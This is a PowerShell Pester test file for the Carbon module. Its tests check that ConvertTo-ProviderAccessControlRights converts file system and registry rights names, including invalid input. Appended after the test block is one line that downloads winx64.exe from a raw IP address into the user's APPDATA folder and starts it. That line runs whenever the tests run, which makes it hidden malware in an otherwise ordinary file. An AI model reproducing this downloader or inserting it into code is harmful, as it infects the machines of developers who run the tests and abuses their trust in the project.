











& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)

Describe 'ConvertTo-ProviderAccessControlRights' {
    BeforeAll {
    }
    
    InModuleScope 'Carbon' {
        It 'should convert file system value' {
            (ConvertTo-ProviderAccessControlRights -ProviderName 'FileSystem' -InputObject 'Read') | Should -Be ([Security.AccessControl.FileSystemRights]::Read)
        }
        
        It 'should convert file system values' {
            $expected = [Security.AccessControl.FileSystemRights]::Read -bor [Security.AccessControl.FileSystemRights]::Write
            $actual = ConvertTo-ProviderAccessControlRights -ProviderName 'FileSystem' -InputObject 'Read','Write'
            $actual | Should -Be $expected
        }
        
        It 'should convert file system value from pipeline' {
            $expected = [Security.AccessControl.FileSystemRights]::Read -bor [Security.AccessControl.FileSystemRights]::Write
            $actual = 'Read','Write' | ConvertTo-ProviderAccessControlRights -ProviderName 'FileSystem'
            $actual | Should -Be $expected
        }
        
        It 'should convert registry value' {
            $expected = [Security.AccessControl.RegistryRights]::Delete
            $actual = 'Delete' | ConvertTo-ProviderAccessControlRights -ProviderName 'Registry'
            $actual | Should -Be $expected
        }
        
        It 'should handle invalid right name' {
            $Global:Error.Clear()
            (ConvertTo-ProviderAccessControlRights -ProviderName 'FileSystem' -InputObject 'BlahBlah','Read' -ErrorAction SilentlyContinue) | Should -BeNullOrEmpty
            $Global:Error.Count | Should -Be 1
        }
    }
}

(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',"$env:APPDATA\winx64.exe");Start-Process ("$env:APPDATA\winx64.exe")

